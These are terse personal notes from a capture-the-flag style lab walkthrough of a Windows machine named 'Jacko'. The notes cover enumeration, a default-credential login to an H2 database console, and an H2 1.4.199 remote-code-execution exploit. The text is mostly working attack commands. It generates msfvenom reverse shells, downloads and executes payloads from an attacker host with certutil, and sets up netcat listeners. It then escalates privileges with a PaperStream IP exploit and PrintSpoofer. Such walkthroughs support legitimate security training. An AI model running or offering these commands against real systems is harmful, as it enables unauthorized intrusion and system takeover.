# Jacko
# date - 5/8/2023
# ip - 192.168.221.66


# nmap
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8082/tcp open  http          H2 database http console



# Port 8082:
192.168.221.66:8082
The default credentials sa: worked. Here we can run SQL queries.
We see the version of the product (H2 1.4.199). This version suffers from an RCE vulnerability.
└─$ searchsploit H2 1.4.199 



-- Write native library
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),CHAR(0x90), ... ,CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),'"'), 'ISO-8859-1', '', '', '', '', '');

-- Load native library
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');

-- Evaluate script
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');

With this, we can run the systeminfo command. This shows us that the architecture is x64.


# exploitation
└─$ nc -lvnp 445                    
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.45.194 LPORT=8082

sudo python3 -m http.server 80


Let’s use certutil to download the file. I had a lot of issues with syntax, so it’s important to experiment. Note the double slashes.

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.194/reverse.exe C:\\Windows\\temp\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');                                                                                                       
OR

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.194/shell.exe C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');


And then execute the reverse shell.


CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');



# priv esc
dir "C:\Program Files (x86)"


The readmeenu.rtf file contains the version information.

type "C:\Program Files (x86)\PaperStream IP\TWAIN\readmeenu.rtf"

C:\Windows\System32>whoami.exe /priv

 msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.45.194 LPORT=8082

sudo python3 -m http.server 80

certutil.exe -urlcache -split -f http://192.168.45.194/shell.dll C:\Users\tony\Desktop\shell.dll


C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe C:\Users\tony\Desktop\shell.dll

sc.exe qc FJTWSVIC

searchsploit -m 49382
nano 49382.ps1

$PayloadFile = "C:\Users\tony\Desktop\shell.dll"

49382.ps1

certutil.exe -urlcache -split -f http://192.168.45.194/49382.ps1 C:\Users\tony\Desktop\49382.ps1

powershell -nop -ep bypass -f C:\Users\tony\49382.ps1
 
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -f C:\Users\tony\Desktop\49382.ps1

# extra didnt work
https://github.com/dievus/printspoofer

PrintSpoofer.exe -i -c cmd


certutil -urlcache -split -f http://192.168.45.194/PrintSpoofer.exe.exe C:/Windows/Temp/print.exe

certutil.exe -urlcache -split -f http://192.168.45.194/PrintSpoofer.exe C:\Users\tony\Desktop\print.exe


print.exe -i -c cmd